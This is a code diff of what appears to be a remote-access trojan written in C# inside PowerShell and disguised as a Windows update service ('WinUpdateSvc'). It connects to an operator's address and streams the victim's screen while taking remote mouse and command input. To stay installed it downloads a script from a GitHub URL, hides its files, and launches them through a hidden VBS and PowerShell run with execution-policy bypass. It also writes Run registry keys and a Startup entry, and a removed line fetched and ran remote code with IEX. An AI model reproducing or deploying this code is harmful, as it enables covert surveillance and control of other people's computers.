@@ -84,6 +84,7 @@ if (-not ("R9KAgent" -as [type])) {
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
+            
             try { SetProcessDPIAware(); } catch {}
             
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
@@ -105,7 +106,9 @@ if (-not ("R9KAgent" -as [type])) {
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
 
-                    while (myClient.Connected) { Thread.Sleep(500); }
+                    while (myClient.Connected) {
+                        Thread.Sleep(500);
+                    }
                 } catch { 
                     Thread.Sleep(3000); 
                 } finally {
@@ -123,16 +126,19 @@ if (-not ("R9KAgent" -as [type])) {
             while (true) {
                 try {
                     if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
+
                     if (!File.Exists(scriptPath)) {
                         string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                         using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
                         File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
+                    
                     if (!File.Exists(vbsPath)) {
                         string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
                         File.WriteAllText(vbsPath, vbs);
                         File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
+
                     string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
                     using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                         if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
@@ -140,6 +146,7 @@ if (-not ("R9KAgent" -as [type])) {
                     using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                         if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                     }
+                    
                     string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                     string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
                     if (!File.Exists(startupVbs)) {
@@ -154,10 +161,10 @@ if (-not ("R9KAgent" -as [type])) {
             try {
                 while (myClient.Connected) {
                     string cmd = myReader.ReadLine();
-                    if (cmd == null) { streaming = false; break; }
+                    if (cmd == null) break;
                     ProcessCommand(cmd.Trim(), myWriter);
                 }
-            } catch { streaming = false; }
+            } catch {}
             try { myClient.Close(); } catch {}
         }
 
@@ -170,29 +177,24 @@ if (-not ("R9KAgent" -as [type])) {
                         if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                     }
                 } catch {}
-                Thread.Sleep(5);
+                Thread.Sleep(10);
             }
         }
 
         static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
             while (myClient.Connected) {
                 try {
-                    if (streaming && myClient.Connected) {
-                        string b64 = CaptureScreen(1280, 35);
+                    if (streaming) {
+                        string b64 = CaptureScreen(1280, 40);
                         if (b64 != null) {
                             lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
-                            Thread.Sleep(20);
+                            Thread.Sleep(30); 
                         } else {
                             Thread.Sleep(100);
                         }
-                    } else { 
-                        streaming = false;
-                        Thread.Sleep(50); 
-                    }
+                    } else { Thread.Sleep(50); }
                 } catch { 
-                    streaming = false;
-                    try { myClient.Close(); } catch {}
-                    break;
+                    Thread.Sleep(1000); 
                 }
             }
         }
@@ -202,16 +204,18 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
-                // COMANDO DE REINSTALAR (NOVO METODO INFALÍVEL)
+                // COMANDO DE REINSTALAR (COM DELAY PARA NÃO TRAVAR O ARQUIVO)
                 if (cmd == "reinstall") {
-                    string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
+                    string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
                     try {
-                        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", "-nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('" + url + "')\"");
+                        // Cria um processo no CMD que espera 2 segundos (garantindo que esse processo morra e libere o arquivo)
+                        // e depois abre o VBS novamente
+                        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c timeout /t 2 /nobreak >nul && wscript.exe //B //Nologo \"" + vbsPath + "\"");
                         psi.WindowStyle = ProcessWindowStyle.Hidden;
                         psi.CreateNoWindow = true;
                         Process.Start(psi);
                     } catch {}
-                    Environment.Exit(0); 
+                    Environment.Exit(0); // Fecha o processo atual
                 }
 
                 if (cmd == "banner_on") {
@@ -295,8 +299,9 @@ if (-not ("R9KAgent" -as [type])) {
 
                 if (cmd.StartsWith("move ")) {
                     string[] p = cmd.Split(' ');
-                    targetX = int.Parse(p[1]);
-                    targetY = int.Parse(p[2]);
+                    int nx = int.Parse(p[1]); int ny = int.Parse(p[2]);
+                    targetX = (int)((nx / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
+                    targetY = (int)((ny / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
                     hasNewPos = true; 
                 }
                 else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
